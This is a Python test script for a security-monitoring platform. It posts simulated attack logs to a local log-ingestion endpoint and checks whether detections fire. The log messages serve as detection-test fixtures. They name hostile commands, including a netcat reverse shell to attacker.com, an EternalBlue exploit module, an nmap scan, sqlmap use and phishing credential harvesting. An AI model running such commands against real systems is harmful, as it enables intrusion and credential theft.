#!/usr/bin/env python3
"""
Detailed test for Attack Agents API and Container functionality
"""

import requests
import json
import time
import sys
from datetime import datetime

BASE_URL = "http://localhost:8080"

def test_attack_agents_detailed():
    """Test attack agents API in detail"""
    print("🔍 Detailed Attack Agents API Test")
    print("=" * 50)
    
    try:
        # Test the attack agents endpoint
        url = f"{BASE_URL}/api/backend/attack-agents"
        print(f"Testing: {url}")
        
        response = requests.get(url, timeout=10)
        print(f"Status Code: {response.status_code}")
        print(f"Headers: {dict(response.headers)}")
        
        if response.content:
            try:
                data = response.json()
                print(f"Response Data: {json.dumps(data, indent=2)}")
                
                if 'agents' in data:
                    agents = data['agents']
                    print(f"\nFound {len(agents)} agents:")
                    for i, agent in enumerate(agents):
                        print(f"\nAgent {i+1}:")
                        for key, value in agent.items():
                            print(f"  {key}: {value}")
                else:
                    print("No 'agents' field in response")
                    
            except json.JSONDecodeError as e:
                print(f"JSON Decode Error: {e}")
                print(f"Raw Response: {response.text}")
        else:
            print("Empty response body")
            
    except Exception as e:
        print(f"Error testing attack agents API: {e}")

def test_container_log_ingestion():
    """Test container log ingestion as regular logs"""
    print("\n🐳 Container Log Ingestion Test")
    print("=" * 50)
    
    # Test various container log scenarios
    test_scenarios = [
        {
            'name': 'Web Attack Container',
            'logs': {
                'agent_id': 'test-web-attack-agent',
                'logs': [
                    {
                        'timestamp': datetime.now().isoformat(),
                        'level': 'INFO',
                        'source': 'AttackContainer',
                        'message': 'Starting sqlmap against http://target.com/login.php',
                        'hostname': 'test-web-attack-agent',
                        'platform': 'Container',
                        'agent_type': 'attack_agent',
                        'container_context': True,
                        'container_id': 'web-attack-001',
                        'attack_type': 'web_attack'
                    },
                    {
                        'timestamp': datetime.now().isoformat(),
                        'level': 'WARNING',
                        'source': 'AttackContainer', 
                        'message': 'SQL injection vulnerability found in parameter "username"',
                        'hostname': 'test-web-attack-agent',
                        'platform': 'Container',
                        'agent_type': 'attack_agent',
                        'container_context': True,
                        'container_id': 'web-attack-001'
                    }
                ]
            }
        },
        {
            'name': 'Network Attack Container',
            'logs': {
                'agent_id': 'test-network-attack-agent',
                'logs': [
                    {
                        'timestamp': datetime.now().isoformat(),
                        'level': 'INFO',
                        'source': 'AttackContainer',
                        'message': 'nmap -sS -O 192.168.1.0/24 scan initiated',
                        'hostname': 'test-network-attack-agent',
                        'platform': 'Container',
                        'agent_type': 'attack_agent',
                        'container_context': True,
                        'container_id': 'network-attack-001',
                        'attack_type': 'network_attack'
                    },
                    {
                        'timestamp': datetime.now().isoformat(),
                        'level': 'INFO',
                        'source': 'AttackContainer',
                        'message': 'Discovered 15 hosts with open ports: 22, 80, 443, 3389',
                        'hostname': 'test-network-attack-agent',
                        'platform': 'Container',
                        'agent_type': 'attack_agent',
                        'container_context': True,
                        'container_id': 'network-attack-001'
                    }
                ]
            }
        },
        {
            'name': 'Phishing Attack Container',
            'logs': {
                'agent_id': 'test-phishing-attack-agent',
                'logs': [
                    {
                        'timestamp': datetime.now().isoformat(),
                        'level': 'INFO',
                        'source': 'AttackContainer',
                        'message': 'Setting up phishing infrastructure on fake-bank.com',
                        'hostname': 'test-phishing-attack-agent',
                        'platform': 'Container',
                        'agent_type': 'attack_agent',
                        'container_context': True,
                        'container_id': 'phishing-attack-001',
                        'attack_type': 'phishing_attack'
                    },
                    {
                        'timestamp': datetime.now().isoformat(),
                        'level': 'WARNING',
                        'source': 'AttackContainer',
                        'message': 'Credential harvesting active - 5 credentials captured',
                        'hostname': 'test-phishing-attack-agent',
                        'platform': 'Container',
                        'agent_type': 'attack_agent',
                        'container_context': True,
                        'container_id': 'phishing-attack-001'
                    }
                ]
            }
        }
    ]
    
    for scenario in test_scenarios:
        print(f"\nTesting {scenario['name']}:")
        try:
            url = f"{BASE_URL}/api/logs/ingest"
            response = requests.post(url, json=scenario['logs'], timeout=10)
            
            print(f"  Status: {response.status_code}")
            if response.status_code == 200:
                data = response.json()
                print(f"  Result: {data.get('message', 'Success')}")
                print(f"  ✅ Container logs ingested as regular logs")
            else:
                print(f"  ❌ Failed: {response.text}")
                
        except Exception as e:
            print(f"  ❌ Error: {e}")

def test_server_logs_for_attack_detection():
    """Check server logs for attack pattern detection"""
    print("\n🔍 Attack Pattern Detection Test")
    print("=" * 50)
    
    # Send logs with attack patterns that should trigger detection
    attack_logs = {
        'agent_id': 'test-attack-detection',
        'logs': [
            {
                'timestamp': datetime.now().isoformat(),
                'level': 'CRITICAL',
                'source': 'AttackContainer',
                'message': 'metasploit exploit/windows/smb/ms17_010_eternalblue executed successfully',
                'hostname': 'test-attack-detection',
                'platform': 'Container',
                'agent_type': 'attack_agent',
                'container_context': True
            },
            {
                'timestamp': datetime.now().isoformat(),
                'level': 'ERROR',
                'source': 'AttackContainer',
                'message': 'reverse shell established via nc -e /bin/bash attacker.com 4444',
                'hostname': 'test-attack-detection',
                'platform': 'Container',
                'agent_type': 'attack_agent',
                'container_context': True
            },
            {
                'timestamp': datetime.now().isoformat(),
                'level': 'WARNING',
                'source': 'AttackContainer',
                'message': 'privilege escalation successful via sudo su -',
                'hostname': 'test-attack-detection',
                'platform': 'Container',
                'agent_type': 'attack_agent',
                'container_context': True
            }
        ]
    }
    
    try:
        url = f"{BASE_URL}/api/logs/ingest"
        response = requests.post(url, json=attack_logs, timeout=10)
        
        print(f"Attack logs ingestion status: {response.status_code}")
        if response.status_code == 200:
            data = response.json()
            print(f"Server response: {data.get('message')}")
            print("✅ Attack pattern logs sent for analysis")
            
            # Wait a moment for processing
            time.sleep(2)
            
            # Check detection results
            detection_url = f"{BASE_URL}/api/backend/detections"
            detection_response = requests.get(detection_url, timeout=10)
            
            if detection_response.status_code == 200:
                detection_data = detection_response.json()
                detections = detection_data.get('data', [])
                print(f"Found {len(detections)} detection results")
                
                # Look for recent detections
                recent_detections = [d for d in detections if 'test-attack-detection' in str(d)]
                print(f"Recent attack detections: {len(recent_detections)}")
                
                if recent_detections:
                    print("✅ Attack pattern detection working")
                else:
                    print("⚠️ No specific attack detections found (may be normal)")
                    
        else:
            print(f"❌ Failed to send attack logs: {response.text}")
            
    except Exception as e:
        print(f"❌ Error testing attack detection: {e}")

def main():
    """Run detailed tests"""
    print("🚀 CodeGrey AI SOC Platform - Detailed Attack Agent Tests")
    print("=" * 60)
    
    test_attack_agents_detailed()
    test_container_log_ingestion()
    test_server_logs_for_attack_detection()
    
    print("\n" + "=" * 60)
    print("✅ Detailed attack agent tests completed!")

if __name__ == "__main__":
    main()
